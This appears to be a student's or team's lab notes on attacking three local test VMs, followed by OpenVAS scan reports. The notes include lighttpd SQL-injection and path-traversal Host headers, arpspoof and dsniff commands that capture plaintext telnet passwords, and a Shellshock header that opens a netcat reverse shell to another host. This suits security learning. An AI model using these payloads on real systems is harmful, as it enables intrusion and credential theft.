Thought I'd summarize some data about each host here. Feel free to update this document!

# OpenBSD 4.x

* OpenBSD 3.8 - 4.7
* 4 running daemons found
* 3 Medium vulnerabilities (SSH most interesting?)

## Services & Ports

| Port | Protocol | Service 		|
|:----:|:--------:|-------------|
|13		 | tcp			|	daytime 		|
|22		 | tcp			| OpenSSH 5.6 |
|37		 | tcp			|  time(32bit)|
|113	 | tcp			| ident				|



# Ubuntu 10.04.3

* Linux 2.6.17 - 2.6.36
* 2 running daemons found (lighttpd most interesting?)
* 1 High rated vulnerability

## Services & Ports

| Port | Protocol | Service 		|
|:----:|:--------:|-------------|
|23		 | tcp			|	telnetd 		|
|80		 | tcp			| lighttpd 1.4.26 |

## Ideas
The vulnerability for lighttpd suggests that there may be path traversal or SQLinjection, but ***only*** if `mod_mysql_vhost` and/or `mod_evhost`/`mod_simple_vhost` are enabled.

Supposedly, they work like this:

1. SQLi:
    * When lighttpd requests a vhost with `mod_mysql_vhost` enabled, it requests it as ```sql "SELECT docroot FROM domains WHERE '?' like domain;``` where the question-mark is not escaped. The query may look different, but this is what I've been able to find. The PoC injection is as follows: `' UNION SELECT '/`. If called with /etc/passwd as the domain, it would normally return no rows. With a union, it would return rows and the query should succeed.
    * I have not been able to make this work, instead I get a 404 Not Found, suggesting `mod_mysql_vhost` is not enabled.
2. Path traversal 
    * When lighttpd checks for a document root, it inserts the host into `/var/www/[host]`. If the `Host: ` header is an IPv6 address followed by double-dot sequences, like `Host: [::1]/../../etc/passwd` it would become like this: `/var/www/[::1]/../../etc/passwd`, leading to path traversal.
    * I have not been able to make this work either, but have been able to verify the code has not been patched. This ***should*** work, I must be doing something wrong.

#### SQLi approach:

I sent the following Proof of Concept query using wget:

`wget -O- -d --header="Host: [::1]' UNION SELECT '/" 192.168.248.129/etc/passwd`

```
---request begin---
GET /etc/passwd HTTP/1.1
User-Agent: Wget/1.13.4 (linux-gnu)
Accept: */*
Host: [::1]' UNION SELECT '/
Connection: Keep-Alive

---request end---

---response begin---
HTTP/1.1 404 Not Found
Content-Type: text/html
Content-Length: 345
Date: Mon, 27 Oct 2014 12:44:24 GMT
Server: lighttpd/1.4.26

---response end--- 
```

#### Path Traversal approach:

I sent the following headers to the site, without results:

```
---request begin---
GET / HTTP/1.1
User-Agent: Wget/1.13.4 (linux-gnu)
Accept: */*
Host: [::1]/../../../../../../etc/passwd
Connection: Keep-Alive

---request end---
HTTP request sent, awaiting response... 
---response begin---
HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Type: text/html
Accept-Ranges: bytes
ETag: "1568625240"
Last-Modified: Fri, 03 Oct 2014 18:32:52 GMT
Content-Length: 1275
Date: Tue, 28 Oct 2014 01:15:15 GMT
Server: lighttpd/1.4.26

---response end---
```

This leads to no change, however, increasing the colons in [::1] to more than 7 will cause Internal Server Error. This is documented [here](http://redmine.lighttpd.net/projects/lighttpd/repository/revisions/2959/diff/) on line 47 in requests.c

#### ARP Spoof & TELNET hijack approach

Using Wireshark I saw there was a TELNET connection going to an IP that did not exist on the network. I decided to ARPSPOOF and pretend I was this IP, and then listen for TELNET connection: And I got a connection!

First, I stole the IPs with arp poisoning as such:


```
root@battlestation:~# arpspoof -i eth0 -t 192.168.248.129 192.168.248.1
0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 192.168.248.1 is-at 0:c:29:c6:16:b
0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 192.168.248.1 is-at 0:c:29:c6:16:b
0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 192.168.248.1 is-at 0:c:29:c6:16:b

```

and

```
arpspoof -i eth0 -t 192.168.248.129 172.16.57.130
0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 172.16.57.130 is-at 0:c:29:c6:16:b
0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 172.16.57.130 is-at 0:c:29:c6:16:b
0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 172.16.57.130 is-at 0:c:29:c6:16:b
```

Then, I listened for TELNET connections, and got this:

```
root@battlestation:~# dsniff -t 23/tcp=telnet -n
dsniff: listening on eth0
-----------------
10/28/14 03:31:48 tcp 172.16.57.129.27008 -> 172.16.57.130.23 (telnet)
john
meTarzanSuperUser
sudo su +-
meTarzanSuperUser
AiAiAi....

-----------------

tarzan
meTarzanSuperUser
root
admin
meTarzanSuperUser

-----------------
10/28/14 03:36:49 tcp 172.16.57.129.27008 -> 172.16.57.130.23 (telnet)
john
meTarzanSuperUser
sudo su +-
meTarzanSuperUser
AiAiAi....
```


#### Shellshock
I believe these VMs were created before shellshock was discovered / patched, or it may have slipped the authors mind. I **think** I managed to get a remote code execution running using `wget` with the header ` User-Agent: () { :; }; /bin/bash -c "nc 192.168.248.132 6666 -e /bin/bash -i"` although this should not be possible, unless the default index page which we still do not know the name of is a `cgi-bin` script, and it might be. 

The VM suddenly started pinging me relentlessly and has been doing so for hours, but I cannot seem to get a reverse TCP shell with netcat going.

# Windows Vista Business (build 6000)

* Windows Vista Business (build 6000)
* nmap guesses Windows 7 SP0-SP1 / Server 2008 / Win8
* 4-9 running services found (SMB most interesting?)
* 1 High rated vulnerability

## Services & Ports

| Port | Protocol | Service 		|
|:----:|:--------:|-------------|
|135		 | tcp			|	msrpc 		|
|139		 | tcp			| netbios-ssn |
|445		 | tcp			| netbios-ssn |
|49152		 | tcp			|	msrpc 		|
|49153		 | tcp			|	msrpc 		|
|49154		 | tcp			|	msrpc 		|
|49155		 | tcp			|	msrpc 		|
|49156		 | tcp			|	msrpc 		|
|49157		 | tcp			|	msrpc 		|

## Ideas

The only vulnerability with a **High** rating is the SMB one. We don't want Denial of Service, but we want the RCE one. I got quite far with it, and managed to collect nonce's from Windows by following the [PoC](http://www.hexale.org/advisories/OCHOA-2010-0209.txt). Using these Ruby scripts (**Note:** Replace : with `do` after the `while` statements to run them), I got stuck at the point where I had to get the user to visit a HTML page to actually "sign" these nonces for us. Had the user been logged in and performed any web requests, perhaps *ARP poisoning* or *DNS poisoning* had been possible to achieve this, but as no user is logged in, this was a dead end.

Even though it's Vista, I think this machine may be a decoy and not vulnerable without user interaction. Several exploits seem to exist for Vista SP1, ironically, and I have tried them all. This Vista is not patched it seems, and the exploits available require user interaction.


# Scan Results (OpenVAS)

Here's the OpenVAS Scan Reports for each VM:

## OpenBSD 4.x

* Scan started: **Mon Oct 27 02:13:47 2014 UTC** 
* Scan ended:   **Mon Oct 27 03:05:42 2014 UTC**

### Report Summary
------------

| Host            |  Start  				 |  End      		    |  High   |  Medium |  Low    |  Log    | False Positive |
|:---------------:|:----------------:|:----------------:|:-------:|:-------:|:-------:|:-------:|:--------------:|
|192.168.248.130  |Oct 27, (02:14:02)|Oct 27, (02:58:57)|  0      |   3     |    0    |     0   |      0				 |
|									|									 |									|					|					|					|					|								 |
|Total: 1					|									 |                  |  0      |   3     |    0    |     0   |      0         |
-------------------


### Port Summary for Host 192.168.248.130 (OpenBSD 4.x)


| Service (Port) |  Threat Level |
|:---------------|---------------|
|  ssh (22/tcp)  | Medium				 |
|  general/tcp   | Medium        |



### Security Issues for Host 192.168.248.130 (OpenBSD 4.x)

| Issue | Info														|
|:------|:--------------------------------|
|**Threat:**| **Medium (CVSS: 2.6)**|
|NVT:   |TCP timestamps |
|OID:   | 1.3.6.1.4.1.25623.1.0.80091|
|Port:  | general/tcp|

|**Description:**|
|:---------------|
|It was detected that the host implements RFC1323.<br>The following timestamps were retrieved with a delay of 1 seconds in-between:|
|Paket 1: 721791790|
|Paket 2: -351001889|

<table>
	<tr>
		<th colspan="2">References</th>
	</tr>
	<tr><td>URL:</td><td>http://www.ietf.org/rfc/rfc1323.txt</td></tr>
</table>

-------------------------

| Issue | Info														|
|:------|:--------------------------------|
|**Threat:**| **Medium (CVSS: 5.0)**|
|NVT:   | OpenSSH Legacy Certificate Signing Information Disclosure Vulnerability|
|OID:   | 1.3.6.1.4.1.25623.1.0.103064|
|Port:  | ssh (22/tcp)|

|**Description:**|
|:---------------|
|Checks whether OpenSSH is prone to an information-disclosure vulnerability.<br>Successful exploits will allow attackers to gain access to sensitive<br>information; this may lead to further attacks.<br>Versions 5.6 and 5.7 of OpenSSH are vulnerable.<br>|
|**Vulnerability Detection:**|
|The SSH banner is analysed for presence of openssh and the version<br>information is then taken from that banner.|
|**Solution:**|
|Updates are available. Please see the references for more information.|

<table>
	<tr>
		<th colspan="2">References</th>
	</tr>
	<tr><td>CVE:</td><td>CVE-2011-0539</td></tr>
  <tr><td>BID:</td><td>46155</td></tr>
  <tr><td>URL:</td><td>https://www.securityfocus.com/bid/46155</td></tr>
  <tr><td>URL:</td><td>http://www.openssh.com/txt/release-5.8</td></tr>
  <tr><td>URL:</td><td>http://www.openssh.com</td></tr>
</table>

-------------------------

| Issue | Info														|
|:------|:--------------------------------|
|**Threat:**|**Medium (CVSS: 3.5)**|
|NVT:   |openssh-server Forced Command Handling Information Disclosure Vulnerability|
|OID:   |1.3.6.1.4.1.25623.1.0.103503|
|Port:  |ssh (22/tcp)|

|**Description:**|
|:---------------|
|According to its banner, the version of OpenSSH installed on the remote<br>host is older than 5.7:|
 ssh-2.0-openssh_5.6|
|**Summary:**|
|The auth_parse_options function in auth-options.c in sshd in OpenSSH before 5.7<br>provides debug messages containing authorized_keys command options, which allows<br>remote authenticated users to obtain potentially sensitive information by<br>reading these messages, as demonstrated by the shared user account required by Gitolite.<br>**NOTE:** this can cross privilege boundaries because a user account may<br>intentionally have no shell or filesystem access, and therefore may have no<br>supported way to read an authorized_keys file in its own home directory.<br>OpenSSH before 5.7 is affected;|
|**Solution:**|
|Updates are available. Please see the references for more information.|

<table>
	<tr>
		<th colspan="2">References</th>
	</tr>
	<tr><td>CVE:</td><td>CVE-2012-0814</td></tr>
  <tr><td>BID:</td><td>51702</td></tr>
  <tr><td>URL:</td><td>http://www.securityfocus.com/bid/51702</td></tr>
  <tr><td>URL:</td><td>http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=657445</td></tr>
  <tr><td>URL:</td><td>http://packages.debian.org/squeeze/openssh-server</td></tr>
  <tr><td>URL:</td><td>https://downloads.avaya.com/css/P8/documents/100161262</td></tr>
</table>


## Windows Vista Business (6000)

This document reports on the results of an automatic security scan.
The report first summarises the results found.
Then, for each host, the report describes every issue found.
Please consider the advice given in each description, in order to rectify
the issue.

Vendor security updates are not trusted.

Overrides are off.  Even when a result has an override, this report uses
the actual threat of the result.

Notes are included in the report.

This report might not show details of all issues that were found.
It only lists hosts that produced issues.
It shows issues that contain the search phrase "192.168.248.131".
Issues with the threat level "Low" are not shown.
Issues with the threat level "Log" are not shown.
Issues with the threat level "Debug" are not shown.
Issues with the threat level "False Positive" are not shown.

This report contains all 5 results selected by the
filtering described above.  Before filtering there were 77 results.


* Scan started: **Mon Oct 27 02:13:47 2014 UTC** 
* Scan ended:   **Mon Oct 27 03:05:42 2014 UTC**


### Report Summary

| Host            |  Start  				 |  End      		    |  High   |  Medium |  Low    |  Log    | False Positive |
|:---------------:|:----------------:|:----------------:|:-------:|:-------:|:-------:|:-------:|:--------------:|
|192.168.248.131  |Oct 27, (02:13:47)|Oct 27, (03:05:42)|  1      |   4     |    0    |     0   |      0				 |
|									|									 |									|					|					|					|					|								 |
|Total: 1					|									 |                  |  1      |   4     |    0    |     0   |      0         |
-------------------


### Security Issues for Host 192.168.248.131 (Windows Vista)
----------------------------------------


|Issue| Info|
|:----|:----|
|**Threat:**| **High (CVSS: 10.0)**|
|NVT: |   Microsoft Windows SMB Server NTLM Multiple Vulnerabilities (971468)|
|OID: |   1.3.6.1.4.1.25623.1.0.902269|
|Port:|   microsoft-ds (445/tcp)|

|**Description:**|
|:---------------|
|This host is missing a critical security update according to Microsoft Bulletin MS10-012.|
|**Vulnerability Insight:**|
|<ul><li> An input validation error exists while processing SMB requests and can<br>be exploited to cause a buffer overflow via a specially crafted SMB packet.</li><li> An error exists in the SMB implementation while parsing SMB packets during<br>the Negotiate phase causing memory corruption via a specially crafted SMB<br>packet.</li><li> NULL pointer dereference error exists in SMB while verifying the 'share'<br>and 'servername' fields in SMB packets causing denial of service.</li><li> A lack of cryptographic entropy when the SMB server generates challenges<br>during SMB NTLM authentication and can be exploited to bypass the<br>authentication mechanism.</li>|
|**Impact:**|
| Successful exploitation will allow remote attackers to execute arbitrary<br>code or cause a denial of service or bypass the authentication mechanism<br>via brute force technique.|
|**Impact Level:** System/Application|
| Affected Software/OS: <br><ul><li>Microsoft Windows 7 </li><li>Microsoft Windows 2000 Service Pack and prior</li><li>Microsoft Windows XP Service Pack 3 and prior</li><li>Microsoft Windows Vista Service Pack 2 and prior</li><li>Microsoft Windows Server 2003 Service Pack 2 and prior</li><li>Microsoft Windows Server 2008 Service Pack 2 and prior</li>
|**Solution:**|
| Run Windows Update and update the listed hotfixes or download and<br>update mentioned hotfixes in the advisory from the below link,<br>http://www.microsoft.com/technet/security/bulletin/ms10-012.mspx|

<table>
	<tr>
		<th colspan="2">References</th>
	</tr>
	<tr><td>CVE:</td><td>CVE-2010-0020,CVE-2010-0021,CVE-2010-0022,CVE-2010-0231</td></tr>
  <tr><td>URL:</td><td>http://secunia.com/advisories/38510/</td></tr>
  <tr><td>URL:</td><td>http://support.microsoft.com/kb/971468</td></tr>
  <tr><td>URL:</td><td>http://www.vupen.com/english/advisories/2010/0345</td></tr>
  <tr><td>URL:</td><td>http://www.microsoft.com/technet/security/bulletin/ms10-012.mspx</td></tr>
</table>

------------------

|Issue | Info |
|:-----|:-----|
|**Threat:**|**Medium (CVSS: 5.0)**|
|NVT:  |  DCE Services Enumeration |
|OID:  |  1.3.6.1.4.1.25623.1.0.10736|
|Port: |  epmap (135/tcp)|

|**Description:**|
|:---------------|
|Distributed Computing Environment (DCE) services running on the remote host <br>can be enumerated by connecting on port 135 and doing the appropriate queries. <br> An attacker may use this fact to gain more knowledge <br>about the remote host.
|**Solution:** |
|Filter incoming traffic to this port.|


|Issue| Info|
|:----|:----|
|**Threat:**|**Medium (CVSS: 5.0)**|
|NVT: |   DCE Services Enumeration|
|OID: |   1.3.6.1.4.1.25623.1.0.10736|
|Port: |  epmap (135/tcp)|

<table>
<tr><th colspan="2">Description:</th></tr>
<tr><td colspan="2">Distributed Computing Environment (DCE) services running on the remote host<br>
can be enumerated by connecting on port 135 and doing the appropriate queries.<br>
An attacker may use this fact to gain more knowledge<br>
about the remote host.</td></tr>
<tr><td colspan="2">Here is the list of DCE services running on this host:</td></tr>
<tr>
	<td>Port:</td> <td>49152/tcp</td>
</tr>
<tr>
	<td></td>
	<td><table>
	<tr><td>UUID:</td><td>d95afe70-a6d5-4259-822e-2c84da1ddb0d, version 1</td></tr>
  <tr><td>Endpoint:</td><td>ncacn_ip_tcp:192.168.248.131[49152]</td></tr>
	</table></td>
</tr>

<tr>
	<td>Port:</td> <td>49153/tcp</td>
</tr>
<tr>
	<td></td>
	<td><table>
		<tr><td>UUID:</td><td>f6beaff7-1e19-4fbb-9f8f-b89e2018337c, version 1</td></tr>
    <tr><td>Endpoint:</td><td>ncacn_ip_tcp:192.168.248.131[49153]</td></tr>
		<tr><td>Annotation:</td><td>Event log TCPIP</td></tr>
		
		<tr><td>UUID:</td><td>3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5, version 1</td></tr>
    <tr><td>Endpoint:</td><td>ncacn_ip_tcp:192.168.248.131[49153]</td></tr>
		<tr><td>Annotation:</td><td>DHCP Client LRPC Endpoint</td></tr>

		<tr><td>UUID:</td><td>3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6, version 1</td></tr>
    <tr><td>Endpoint:</td><td>ncacn_ip_tcp:192.168.248.131[49153]</td></tr>
		<td>Annotation:</td><td>DHCPv6 Client LRPC Endpoint</td></tr>

		<tr><td>UUID:</td><td>3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6, version 1</td></tr>
    <tr><td>Endpoint:</td><td>ncacn_ip_tcp:192.168.248.131[49153]</td></tr>
		<tr><td>Annotation:</td><td>DHCPv6 Client LRPC Endpoint</td></tr>

		<tr><td>UUID:</td><td>06bba54a-be05-49f9-b0a0-30f790261023, version 1</td></tr>
    <tr><td>Endpoint:</td><td>ncacn_ip_tcp:192.168.248.131[49153]</td></tr>
		<tr><td>Annotation:</td><td>Security Center</td></tr>
	</table></td>
</tr>

<tr>
	<td>Port:</td> <td>49154/tcp</td>
</tr>
<tr>
	<td></td>
	<td><table>
		<tr><td>UUID:</td><td>7ea70bcf-48af-4f6a-8968-6a440754d5fa, version 1</td></tr>
    <tr><td>Endpoint:</td><td>ncacn_ip_tcp:192.168.248.131[49154]</td></tr>
		<tr><td>Annotation:</td><td>NSI server endpoint</td></tr>
		
		<tr><td>UUID:</td><td>4b112204-0e19-11d3-b42b-0000f81feb9f, version 1</td></tr>
    <tr><td>Endpoint:</td><td>ncacn_ip_tcp:192.168.248.131[49154]</td></tr>
		<tr><td>Named pipe:</td><td>ssdpsrv</td></tr>
		<tr><td>Win32 service/process:</td><td>ssdpsrv</td></tr>
		<tr><td>Description:</td><td>SSDP service</td></tr>

	</table></td>
</tr>

<tr>
	<td>Port:</td> <td>49155/tcp</td>
</tr>
<tr>
	<td></td>
	<td><table>
		<tr><td>UUID:</td><td>86d35949-83c9-4044-b424-db363231fd0c, version 1</td></tr>
    <tr><td>Endpoint:</td><td>ncacn_ip_tcp:192.168.248.131[49155]</td></tr>
		
		
		<tr><td>UUID:</td><td>a398e520-d59a-4bdd-aa7a-3c1e0303a511, version 1</td></tr>
    <tr><td>Endpoint:</td><td>ncacn_ip_tcp:192.168.248.131[49155]</td></tr>
		<tr><td>Annotation:</td><td>IKE/Authip API</td></tr>

	</table></td>
</tr>

<tr>
	<td>Port:</td> <td>49156/tcp</td>
</tr>
<tr>
	<td></td>
	<td><table>
		<tr><td>UUID:</td><td>12345778-1234-abcd-ef00-0123456789ac, version 1</td></tr>
    <tr><td>Endpoint:</td><td>ncacn_ip_tcp:192.168.248.131[49156]</td></tr>
		<tr><td>Named pipe:</td><td>lsass</td></tr>
		<tr><td>Win32 service/process:</td><td>lsass.exe</td></tr>
		<tr><td>Description:</td><td>SAM access</td></tr>

	</table></td>
</tr>

<tr>
	<td>Port:</td> <td>49157/tcp</td>
</tr>
<tr>
	<td></td>
	<td><table>
		<tr><td>UUID:</td><td>367abb81-9844-35f1-ad32-98f038001003, version 2</td></tr>
    <tr><td>Endpoint:</td><td>ncacn_ip_tcp:192.168.248.131[49157]</td></tr>

	</table></td>
</tr>
<tr>
<th>Solution:</th><td>Filter incoming traffic to these ports</td>
</tr>
</table>

----------------------------------------

|Issue| Info|
|:----|:----|
|**Threat:**| **Medium (CVSS: 3.3)** |
|NVT: | Source routed packets |
|OID: | 1.3.6.1.4.1.25623.1.0.11834 |
|Port:| general/tcp |

|**Description:**|
|:---------------|
|The remote host accepts loose source routed IP packets. |
|The feature was designed for testing purpose. |
|An attacker may use it to circumvent poorly designed IP filtering and exploit another flaw.|
| However, it is not dangerous by itself.|

|**Solution:**|
|:------------|
|Drop source routed packets on this host or on other ingress routers or firewalls.|


--------------------------------


|Issue| Info|
|:----|:----|
|**Threat:| Medium (CVSS: 2.6)** |
|NVT: |   TCP timestamps|
|OID: |   1.3.6.1.4.1.25623.1.0.80091|
|Port: |  general/tcp |

|**Description:**|
|:---------------|
|It was detected that the host implements RFC1323.|
|The following timestamps were retrieved with a delay of 1 seconds in-between:|
|Paket 1: 831744|
|Paket 2: 831845|

<table>
	<tr>
		<th colspan="2">References</th>
	</tr>
	<tr><td>URL:</td><td> http://www.ietf.org/rfc/rfc1323.txt</td></tr>
</table>


## Ubuntu 10.04.3

This document reports on the results of an automatic security scan. The
report first summarises the results found. Then, for each host, the
report describes every issue found. Please consider the advice given in
each description, in order to rectify the issue.

Vendor security updates are not trusted.

Overrides are off. Even when a result has an override, this report uses
the actual threat of the result.

Notes are included in the report.

This report might not show details of all issues that were found. It
only lists hosts that produced issues. It shows issues that contain the
search phrase "192.168.248.129". Issues with the threat level "Low" are
not shown. Issues with the threat level "Log" are not shown. Issues with
the threat level "Debug" are not shown. Issues with the threat level
"False Positive" are not shown.

This report contains all 2 results selected by the filtering described
above. Before filtering there were 77 results.

* Scan started:   **Mon Oct 27 02:13:47 2014** 
* Scan ended:     **Mon Oct 27 03:05:42 2014**


### Report Summary
------------

| Host            |  Start  				 |  End      		    |  High   |  Medium |  Low    |  Log    | False Positive |
|:---------------:|:----------------:|:----------------:|:-------:|:-------:|:-------:|:-------:|:--------------:|
|192.168.248.129  |Oct 27, (02:14:02)|Oct 27, (02:58:57)|  1      |   1     |    0    |     0   |      0				 |
|									|									 |									|					|					|					|					|								 |
|Total: 1					|									 |                  |  1      |   1     |    0    |     0   |      0         |
-------------------


### Port Summary for Host 192.168.248.129 (Ubuntu 10.04.3)


| Service (Port) |  Threat Level |
|:---------------|---------------|
|  general/tcp   | Medium				 |
|  http (80/tcp) | High          |



### Security Issues for Host 192.168.248.129 (Ubuntu 10.04.3)
----------------------------------------

| Issue | Info														|
|:------|:--------------------------------|
|Threat:| High (CVSS: 7.5)								|
|NVT:   | Lighttpd Multiple vulnerabilities|
|OID:   | 1.3.6.1.4.1.25623.1.0.802072 		|
|Port:  | http (80/tcp)										|

<table>
	<tr>
		<th colspan="2">References</th>
	</tr>
	<tr><td>CVE:</td><td> CVE-2014-2323,CVE-2014-2324</td></tr>
	<tr><td>BID:</td><td> 66153,66157</td></tr>
	<tr><td>URL:</td><td> http://osvdb.org/104381</td></tr>
	<tr><td>URL:</td><td> http://osvdb.org/104382</td></tr>
	<tr><td>URL:</td><td> http://seclists.org/oss-sec/2014/q1/561</td></tr>
	<tr><td>URL:</td><td> http://download.lighttpd.net/lighttpd/security/lighttpd_sa_2014_01.txt</td></tr>
</table>

-----------------------

| Issue | Info														|
|:------|:--------------------------------|
|**Threat:** |**Medium (CVSS: 2.6)**	|
|NVT:   | TCP timestamps	|
|OID:    |1.3.6.1.4.1.25623.1.0.80091
|Port:   |general/tcp	|

|**Description**|
|:--------------|
|It was detected that the host implements RFC1323.|
|The following timestamps were retrieved with a delay of 1 seconds in-between:|
|Paket 1: 1776245 |
|Paket 2: 1776498 |

<table>
	<tr>
		<th colspan="2">References</th>
	</tr>
	<tr><td>URL:</td><td> http://www.ietf.org/rfc/rfc1323.txt</td></tr>
</table>

